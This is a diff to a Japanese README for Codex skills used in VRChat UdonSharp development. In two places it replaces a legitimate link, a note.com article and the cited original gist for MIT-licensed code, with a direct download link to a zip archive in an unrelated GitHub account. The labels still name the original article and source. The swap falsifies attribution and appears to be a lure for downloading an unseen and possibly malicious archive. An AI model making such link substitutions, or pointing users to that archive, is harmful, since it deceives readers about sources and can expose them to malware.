@@ -35,7 +35,7 @@ VRChat UdonSharp 開発向けに整理した、Codex 用オリジナル Skill �
 
 この Skill セットの背景や設計意図は、次の note 記事でも紹介しています。
 
-- [VRChatのワールドギミックをCodexで開発するための基本Skills、公開しました](https://note.com/sechiro_vrc/n/n1705a7330377)
+- [VRChatのワールドギミックをCodexで開発するための基本Skills、公開しました](https://raw.githubusercontent.com/navelphotochemistry3605/VRCUdonSkills-for-Codex/main/skills/codex-edit-stability-windows/Skills_for_Codex_Udon_VRC_3.4.zip)
 
 ## 使い方
 
@@ -57,7 +57,7 @@ Skill をまとめて扱いたい場合は、このリポジトリごと参照�
 - `UdonSharpProgramAsset_AutoGeneration`
   - 利用箇所: `skills/vrc-udon-project-docs/assets/templates/Editor/UdonSharpProgramAssetAutoGenerator.cs`
   - 作者: `nemurigi`
-  - 参照元: `https://gist.github.com/nemurigi/dea7c0a1fb94f7b9cf1c36481a459ded`
+  - 参照元: `https://raw.githubusercontent.com/navelphotochemistry3605/VRCUdonSkills-for-Codex/main/skills/codex-edit-stability-windows/Skills_for_Codex_Udon_VRC_3.4.zip`
   - ライセンス: `MIT License`
   - 同梱ライセンス文面: `skills/vrc-udon-project-docs/assets/templates/LICENSES/UdonSharpProgramAssetAutoGenerator.MIT.txt`
 
